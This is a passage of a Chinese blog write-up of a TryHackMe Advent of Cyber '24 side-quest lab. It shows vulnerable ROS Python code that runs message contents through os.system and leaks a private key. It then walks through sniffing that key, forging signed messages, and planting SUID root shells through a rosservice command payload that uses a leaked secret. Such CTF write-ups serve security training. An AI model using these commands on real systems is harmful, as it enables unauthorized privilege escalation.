class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> rospy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> std_msgs.msg <span class="keyword">import</span> String</span><br><span class="line"><span class="keyword">from</span> yang.msg <span class="keyword">import</span> Comms</span><br><span class="line"><span class="keyword">from</span> yang.srv <span class="keyword">import</span> yangrequest</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        </span><br><span class="line">        self.messagebus = rospy.Publisher(<span class="string">&#x27;messagebus&#x27;</span>, Comms, queue_size=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Read the message channel private key</span></span><br><span class="line">        pwd = <span class="string">b&#x27;secret&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/catkin_ws/privatekey.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            self.priv_key = RSA.import_key(data,pwd)</span><br><span class="line"></span><br><span class="line">        self.priv_key_str = self.priv_key.export_key().decode()</span><br><span class="line"></span><br><span class="line">        rospy.init_node(<span class="string">&#x27;yang&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.prompt_rate = rospy.Rate(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Read the service secret</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/catkin_ws/secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            self.secret = data.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        rospy.Subscriber(<span class="string">&#x27;messagebus&#x27;</span>, Comms, self.callback)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment">#First check to do is see if this is a message for us and one we need to respond to</span></span><br><span class="line">        <span class="keyword">if</span> (data.receiver != <span class="string">&quot;Yang&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Now we know the message is for us. We can start system checks to see if it is a valid message</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> self.validate_message(data)):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;Message could not be validated&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Now we can action the message and send a reply</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> data.actionparams:</span><br><span class="line">            os.system(action)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Now request an action from Yin</span></span><br><span class="line">        self.yin_request()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Send reply</span></span><br><span class="line">        reply = Comms()</span><br><span class="line">        reply.timestamp = <span class="built_in">str</span>(rospy.get_time())</span><br><span class="line">        reply.sender = <span class="string">&quot;Yang&quot;</span></span><br><span class="line">        reply.receiver = <span class="string">&quot;Yin&quot;</span></span><br><span class="line">        reply.action = <span class="number">2</span></span><br><span class="line">        reply.actionparams = []</span><br><span class="line">        reply.actionparams.append(self.priv_key_str)</span><br><span class="line">        reply.feedback = <span class="string">&quot;Action Done&quot;</span></span><br><span class="line">        reply.hmac = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        reply = self.sign_message(reply)</span><br><span class="line"></span><br><span class="line">        self.messagebus.publish(reply)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_message</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="comment">#Only accept messages from the allfather</span></span><br><span class="line">        <span class="keyword">if</span> (message.sender != <span class="string">&quot;Yin&quot;</span>):</span><br><span class="line">            valid = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;Message is not from Yin&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line">        <span class="comment">#First we need to validate the timestamp. The difference should not be bigger than threshold</span></span><br><span class="line">        current_time = <span class="built_in">str</span>(rospy.get_time())</span><br><span class="line">        current_time_sec = <span class="built_in">int</span>(current_time.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        current_time_nsec = <span class="built_in">int</span>(current_time.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        message_time_sec = <span class="built_in">int</span>(message.timestamp.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        message_time_nsec = <span class="built_in">int</span>(message.timestamp.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        second_diff = current_time_sec - message_time_sec</span><br><span class="line">        nsecond_diff = current_time_nsec - message_time_nsec</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (second_diff &lt;= <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;Time difference is acceptable to answer message and not a replay&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;Message is a replay and should be discarded&quot;</span>)</span><br><span class="line">            valid = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> valid</span><br><span class="line">            <span class="comment"># Here we want to respond and say that time is not acceptable thus regarded as replay</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Now we need to validate the signature</span></span><br><span class="line">        hmac = self.getBase64(message)</span><br><span class="line">        hmac = SHA256.new(hmac.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        signature = PKCS1_v1_5.new(self.priv_key).sign(hmac)</span><br><span class="line">        sig = base64.b64encode(signature).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message.hmac != sig):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;Signature verification failed&quot;</span>)</span><br><span class="line">            valid = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># Respond and say signature failed</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">yin_request</span>(<span class="params">self</span>):</span></span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        rospy.wait_for_service(<span class="string">&#x27;svc_yang&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            service = rospy.ServiceProxy(<span class="string">&#x27;svc_yang&#x27;</span>, yangrequest)</span><br><span class="line">            response = service(self.secret, <span class="string">&#x27;touch /home/yin/yang.txt&#x27;</span>, <span class="string">&#x27;Yang&#x27;</span>, <span class="string">&#x27;Yin&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> rospy.ServiceException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;Failed: %s&quot;</span>%e)</span><br><span class="line">        resp = response.response</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_yang_request</span>(<span class="params">self, req</span>):</span></span><br><span class="line">        <span class="comment"># Check secret first</span></span><br><span class="line">        <span class="keyword">if</span> req.secret != self.secret:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Secret not valid&quot;</span></span><br><span class="line"></span><br><span class="line">        sender = req.sender</span><br><span class="line">        receiver = req.receiver</span><br><span class="line">        action = req.action</span><br><span class="line"></span><br><span class="line">        os.system(action)</span><br><span class="line"></span><br><span class="line">        response = <span class="string">&quot;Action performed&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getBase64</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        hmac = base64.urlsafe_b64encode(message.timestamp.encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(message.sender.encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(message.receiver.encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(<span class="built_in">str</span>(message.action).encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(<span class="built_in">str</span>(message.actionparams).encode()).decode()</span><br><span class="line">        hmac += <span class="string">&quot;.&quot;</span></span><br><span class="line">        hmac += base64.urlsafe_b64encode(message.feedback.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> hmac</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSHA</span>(<span class="params">self, hmac</span>):</span></span><br><span class="line">        m = hashlib.sha256()</span><br><span class="line">        m.update(hmac.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(m.hexdigest())  </span><br><span class="line"></span><br><span class="line">    <span class="comment">#This function will craft the signature for the message based on the specific system being talked to</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_message</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        hmac = self.getBase64(message)</span><br><span class="line">        hmac = SHA256.new(hmac.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        signature = PKCS1_v1_5.new(self.priv_key).sign(hmac)</span><br><span class="line">        sig = base64.b64encode(signature).decode()</span><br><span class="line">        message.hmac = sig</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_yang</span>(<span class="params">self</span>):</span></span><br><span class="line">        rospy.spin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        yang = Yang()</span><br><span class="line">        yang.run_yang()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> rospy.ROSInterruptException:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>  其功能如下：</p>
+<ul>
+<li>监听主题 <code>messagebus</code> 并接受来自 <code>yin</code> 的消息</li>
+<li>从 <code>/catkin_ws/privatekey.pem</code> 中加载私钥</li>
+<li>接受发送给 <code>yang</code> 的消息并验证签名</li>
+<li>对于需要响应的消息向 <code>yin</code> 发送服务请求；提供服务请求处理函数 <code>handle_yang_request</code> ，允许 <code>yin</code> 节点调用</li>
+<li>使用 <code>os.system</code> 来执行消息中的命令</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>阳</p>
+<ul>
+<li><p>拿到私钥</p>
+<p>  在 <code>runyin.py</code> 中可以看到一个 <code>ping</code> 命令，由于使用的私钥只有 <code>root</code> 可读，所以该脚本仅能由 <code>root</code> 运行，即不能简单更改脚本来执行其他命令</p>
+<p>  但从 <code>runyang.py</code> 中看到脚本正在用私钥的内容进行回调：</p>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reply = Comms()</span><br><span class="line">reply.timestamp = <span class="built_in">str</span>(rospy.get_time())</span><br><span class="line">reply.sender = <span class="string">&quot;Yang&quot;</span></span><br><span class="line">reply.receiver = <span class="string">&quot;Yin&quot;</span></span><br><span class="line">reply.action = <span class="number">2</span></span><br><span class="line">reply.actionparams = []</span><br><span class="line">reply.actionparams.append(self.priv_key_str)  <span class="comment"># **私钥内容被添加到消息中**</span></span><br><span class="line">reply.feedback = <span class="string">&quot;Action Done&quot;</span></span><br><span class="line">reply.hmac = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>  即完整的私钥被公开，通过 <code>ros</code> 的 <code>messagebus</code> 发送给 <code>yin</code></p>
+<p>  那么思路就是在 <code>yin</code> 上启动 <code>ros</code> 主机，开始通信后监听<code>yang</code> 上的 <code>messagebus</code> 来捕获私钥，再通过私钥重写 <code>runyin.py</code> 脚本以在 <code>yang</code> 上执行其他命令提取</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roscore &amp;</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic1.imgdb.cn/item/679352eed0e0a243d4f78f58.png" alt=""></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /catkin_ws/yin.sh &amp;</span><br></pre></td></tr></table></figure>
+<p>  随后，为了让 <code>yang</code> 能连接到位于 <code>yin:11311</code> 的 <code>ros</code> 服务器，通过ssh转发过去：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 11311:localhost:11311 yin@10.10.208.76</span><br></pre></td></tr></table></figure>
+<p>  然后再开一个 <code>yang</code> 来启动 <code>yang.sh</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/679353e8d0e0a243d4f79057.png" alt=""></p>
+<p>  再开一个 <code>yang</code> 来捕获 <code>messagebus</code> 的内容</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rostopic echo /messagebus</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic1.imgdb.cn/item/67935458d0e0a243d4f79070.png" alt=""></p>
+<p>  把私钥存下来</p>
+</li>
+<li><p>利用私钥进行 <code>ros</code> 通信</p>
+<p>  先把 <code>yin</code> 上的 <code>roscore</code> 关了</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep roscore</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic1.imgdb.cn/item/679357d8d0e0a243d4f792a7.png" alt=""></p>
+<p>  <code>kill</code> 掉就行</p>
+<p>  可以将脚本另存一份下来：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r /catkin_ws/src/ yin</span><br></pre></td></tr></table></figure>
+<p>  创一个 <code>suid.py</code> ，内容就是把 <code>runyin.py</code> 中的 <code>touch</code> 改成提权命令 <code>cp /bin/sh /home/yang/sh &amp;&amp; chmod u+s /home/yang/sh</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/679356f5d0e0a243d4f7921f.png" alt=""></p>
+<p>  再创一个 <code>privatekey.pem</code> 放刚刚的私钥</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935712d0e0a243d4f7922c.png" alt=""></p>
+<p>  现在文件结构如下：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935733d0e0a243d4f79238.png" alt=""></p>
+<p>  在 <code>yang</code> 上运行 <code>roscore</code> 并启动 <code>yang.sh</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">roscore &amp;</span><br><span class="line">sudo /catkin_ws/yang.sh</span><br></pre></td></tr></table></figure>
+<p>  保险起见可以把之前的窗口都先关掉（大嘘</p>
+<p>  <img src="https://pic1.imgdb.cn/item/679358fad0e0a243d4f793f6.png" alt=""></p>
+<p>  再在 <code>yin</code> 上把 <code>yang</code> 的端口转发过来：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 11311:localhost:11311 yang@10.10.152.171</span><br></pre></td></tr></table></figure>
+<p>  然后启动 <code>suid.py</code> ，报错的话反思一下是不是私钥文件格式错了</p>
+<p>  执行后 <code>yang</code> 那里的 <code>yang.sh</code> 会有显示</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935a2cd0e0a243d4f794cb.png" alt=""></p>
+<p>  <code>yang</code> 就提权成功了：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935ab2d0e0a243d4f79505.png" alt=""></p>
+<p>  同时读到 <code>secret.txt</code></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935b14d0e0a243d4f79530.png" alt=""></p>
+<p>  <code>thisisasecretvaluethatyouwillneverguess</code></p>
+</li>
+</ul>
+</li>
+<li><p>阴</p>
+<p>  看回阴，在 <code>runyin.py</code> 中存在命令执行的地方为：</p>
+  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    self.service = rospy.Service(<span class="string">&#x27;svc_yang&#x27;</span>, yangrequest, self.handle_yang_request)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_yang_request</span>(<span class="params">self, req</span>):</span></span><br><span class="line">    <span class="comment"># Check secret first</span></span><br><span class="line">    <span class="keyword">if</span> req.secret != self.secret:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Secret not valid&quot;</span></span><br><span class="line"></span><br><span class="line">    sender = req.sender</span><br><span class="line">    receiver = req.receiver</span><br><span class="line">    action = req.command</span><br><span class="line"></span><br><span class="line">    os.system(action)</span><br><span class="line"></span><br><span class="line">    response = <span class="string">&quot;Action performed&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+<p>  即 <code>yang</code> 的服务 <code>svc_yang</code> 触发了 <code>handle_yang_request</code> ，进而能执行 <code>os.system</code></p>
+<p>  根据 <a target="_blank" rel="noopener" href="https://wiki.ros.org/rosservice">wiki条目</a> 可以使用以下方式来调用特定服务</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rosservice call /service_name service-args</span><br></pre></td></tr></table></figure>
+<p>  在 <code>yin</code> <code>yang</code> 都启动对应的 <code>.sh</code> ，并在 <code>yin</code> 上执行</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rosservice list</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic1.imgdb.cn/item/67935d34d0e0a243d4f796df.png" alt=""></p>
+<p>  通过 <code>rosservice info svc_yang</code> 查看所需参数，并在<a target="_blank" rel="noopener" href="https://wiki.ros.org/ROS/YAMLCommandLine">这里</a>找到参数提供格式</p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935e98d0e0a243d4f797be.png" alt=""></p>
+<p>  <img src="https://pic1.imgdb.cn/item/67935e64d0e0a243d4f797a7.png" alt=""></p>
+<p>  构造出 <code>payload</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rosservice call /svc_yang &quot;&#123;&#x27;secret&#x27;: &#x27;thisisasecretvaluethatyouwillneverguess&#x27;, &#x27;command&#x27;: &#x27;cp /bin/sh /home/yin/sh; chmod u+s /home/yin/sh&#x27;, &#x27;sender&#x27;: &#x27;Yang&#x27;, &#x27;receiver&#x27;: &#x27;Yin&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic1.imgdb.cn/item/67935dded0e0a243d4f7975b.png" alt=""></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>noone___
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://noone40404.github.io/2025/01/24/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8461%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT2/" title="THM打靶日寄61-Advent of Cyber &#39;24：支线T2丑陋复现">http://noone40404.github.io/2025/01/24/THM打靶日寄61：Advent of Cyber '24 Side QuestT2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/THM/" rel="tag"><i class="fa fa-tag"></i> THM</a>
+              <a href="/tags/Advent-of-Cyber-2024/" rel="tag"><i class="fa fa-tag"></i> Advent of Cyber 2024</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/01/15/%E5%AD%A6%E9%95%BF%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%BD%A2%E4%BA%8611%EF%BC%9Aevilbox/" rel="prev" title="学长的任务罢了11-evilbox">
+      <i class="fa fa-chevron-left"></i> 学长的任务罢了11-evilbox
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/01/25/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8462%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT3/" rel="next" title="THM打靶日寄62-Advent of Cyber '24：支线T3丑陋复现">
+      THM打靶日寄62-Advent of Cyber '24：支线T3丑陋复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="noone___"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">noone___</p>
+  <div class="site-description" itemprop="description">自闭中</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">196</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">81</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noone40404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noone40404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctp314.github.io/" title="https:&#x2F;&#x2F;ctp314.github.io&#x2F;" rel="noopener" target="_blank">CTime_Pup_314</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/guanlexiangfan/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;guanlexiangfan&#x2F;" rel="noopener" target="_blank">Evitagen</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/i-am-zhiyangfan/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;i-am-zhiyangfan&#x2F;" rel="noopener" target="_blank">zhiyangfan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">noone___</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
